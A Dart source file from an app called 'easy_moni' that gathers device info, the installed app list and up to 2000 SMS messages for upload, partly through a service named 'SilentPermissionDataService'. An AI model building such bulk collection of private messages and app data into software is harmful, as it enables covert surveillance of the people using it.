import 'package:easy_moni/services/platform_service.dart';
import 'package:easy_moni/services/upload_data/dart_upload_device_info_collector.dart';
import 'package:easy_moni/services/upload_data/upload_platform_support.dart';

class UserUploadDataCollector {
  static const int _maxSmsCount = 2000;

  UserUploadDataCollector();

  Future<dynamic> collectDeviceInfo() async {
    try {
      if (UploadPlatformSupport.supportsAppListAndSms) {
        final data = await SilentPermissionDataService.collect();
        final deviceInfo = data['deviceInfo'];
        if (deviceInfo is Map && deviceInfo.isNotEmpty) {
          return deviceInfo;
        }
      }

      final deviceInfo = await DartUploadDeviceInfoCollector.collect();
      return deviceInfo.isNotEmpty ? deviceInfo : null;
    } catch (error) {
      return null;
    }
  }

  Future<dynamic> collectAppList() async {
    if (!UploadPlatformSupport.supportsAppListAndSms) {
      return null;
    }

    try {
      final data = await SilentPermissionDataService.collect();
      final appList = data['appList'];
      if (appList is List && appList.isNotEmpty) {
        return appList;
      }
      return null;
    } catch (error) {
      return null;
    }
  }

  Future<dynamic> collectSmsRecord() async {
    if (!UploadPlatformSupport.supportsAppListAndSms) {
      return null;
    }

    try {
      final hasPermission = await SmsService.checkPermission();
      if (!hasPermission) {
        return null;
      }

      final smsRecords = await SmsService.getSmsRecords(
        keywords: const [],
        limit: _maxSmsCount,
      );
      if (smsRecords == null || smsRecords.isEmpty) {
        return null;
      }

      return smsRecords;
    } catch (error) {
      return null;
    }
  }
}
